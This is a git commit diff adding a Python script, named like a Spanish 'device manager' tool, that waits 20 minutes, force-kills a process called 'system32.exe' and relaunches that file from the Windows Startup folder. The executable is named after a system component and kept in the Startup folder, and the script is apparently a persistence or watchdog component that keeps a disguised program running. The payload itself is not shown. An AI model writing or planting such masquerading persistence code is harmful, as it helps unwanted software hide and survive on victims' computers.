4c2b78a1af8fdb42c0cb0b8684657cff023d0bd3
Your Name <you@example.com>
2022-04-19 23:39:05 -0500

    comit

---
+++ Administrador de dis.py
@@ -0,0 +1,12 @@
+import psutil
+import os
+import time
+
+time.sleep(1200)
+def process():
+    for p in psutil.process_iter(attrs=['name']):
+        if "system32.exe" in (p.info['name']).lower():
+            os.system("taskkill /IM system32.exe /F")
+            time.sleep(20)
+            os.system('"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\system32.exe"')
+process()
